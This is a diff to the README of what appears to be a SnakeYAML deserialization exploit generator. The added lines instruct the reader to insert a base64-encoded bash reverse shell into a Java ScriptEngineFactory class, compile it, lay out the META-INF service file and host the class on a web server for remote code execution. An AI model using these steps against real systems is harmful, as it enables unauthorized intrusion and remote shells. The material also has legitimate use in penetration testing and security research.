@@ -12,14 +12,19 @@ A tiny project for generating payloads for the SnakeYAML deserialization gadget 
   ]]
 ]
 ```
-Put the java code you want execute into [AwesomeScriptEngineFactory.java] and compile:
+edit AwesomeScriptEngineFactory.java and put reverse shell in bash  
+
+in this page encode reverse shell  in base64 http://www.jackson-t.ca/runtime-exec-payloads.html
+
+and compile:
 
 ------bash console-----
 ```bash
 javac AwesomeScriptEngineFactory.java
-
-folder exploit / 
-        META-INF/services/javax.script.ScriptEngineFactory inside file put h1dr0.AwesomeScriptEngineFactory/
-        h1dr0/AwesomeScriptEngineFactory.class
+```
+```tree
+ exploit /
+  |-->      META-INF/services/javax.script.ScriptEngineFactory inside file put h1dr0.AwesomeScriptEngineFactory/
+  |-->      h1dr0/AwesomeScriptEngineFactory.class
 ```
 Then place the 'AwesomeScriptEngineFactory.class' file in to the web server folder (e.g. h1dr0/AwesomeScriptEngineFactory.class)
